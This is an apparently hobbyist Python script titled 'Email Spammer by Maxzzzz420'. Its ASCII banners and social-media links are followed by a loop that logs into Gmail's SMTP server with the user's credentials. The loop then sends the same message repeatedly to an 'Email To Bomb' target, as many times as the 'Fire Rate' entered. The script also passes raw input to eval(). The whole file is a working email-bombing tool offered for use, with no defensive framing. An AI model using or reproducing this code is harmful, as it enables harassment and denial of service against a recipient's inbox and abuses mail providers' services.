

import os
import smtplib
import getpass
import sys
import time


from email.mime.text import MIMEText
from smtplib import SMTP


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



os.system("clear")
print('' + bcolors.WARNING)

print('                +---------------------------------------------------------+        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                |               Email Spammer by Maxzzzz420               |        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                |                                                         |        ')
print('                +---------------------------------------------------------+        ')       

                                   
time.sleep(2)

os.system("clear")








time.sleep(2)

os.system("clear")

print("""███╗   ███╗ █████╗ ██╗  ██╗███████╗███████╗███████╗███████╗ ██████╗  ██████╗  ██████╗ 
████╗ ████║██╔══██╗╚██╗██╔╝╚══███╔╝╚══███╔╝╚══███╔╝╚══███╔╝██╔════╝ ██╔════╝ ██╔════╝ 
██╔████╔██║███████║ ╚███╔╝   ███╔╝   ███╔╝   ███╔╝   ███╔╝ ███████╗ ███████╗ ███████╗ 
██║╚██╔╝██║██╔══██║ ██╔██╗  ███╔╝   ███╔╝   ███╔╝   ███╔╝  ██╔═══██╗██╔═══██╗██╔═══██╗
██║ ╚═╝ ██║██║  ██║██╔╝ ██╗███████╗███████╗███████╗███████╗╚██████╔╝╚██████╔╝╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝ """ + bcolors.OKGREEN)



print("TikTok : Maxzzzz666") 
print("github   : https://github.com/maxzzzz666") 
print("YouTube :  https://www.youtube.com/channel/UCZX4AfKOw5qmYQZhtRTn74Q")
print("Instagram : Maxzzzz666" + bcolors.OKGREEN)

time.sleep(2)





print('    ')
sender =  input('Attacker Email:   ') # change to your email
print('    ')

subjcet = input('Subject:    ')
print('    ')
password = input('Password:   ') # edit for your password
print('    ')
recipient = input('Email To Bomb :  ')
print('    ')
firerate = eval(input('Fire Rate!:  '))
print('    ')
msg = input('Message:  ')

print('    ' +bcolors.OKBLUE)



s = smtplib.SMTP(host='smtp.gmail.com', port=587)

s.ehlo()
s.starttls()
s.ehlo()
s.login(sender, password)





fire = 0

while firerate >= fire:

	s.sendmail(sender, recipient, msg)
	fire += 1

	print('email sent: ' + str(fire))



if firerate <= fire:

	print('Sent all Emails')



  










def spinning_cursor():
    while True:
        for cursor in '|/-\\':
            yield cursor

spinner = spinning_cursor()
for _ in range(50):
    sys.stdout.write(next(spinner))
    sys.stdout.flush()
    time.sleep(0.1)
    sys.stdout.write('\b')





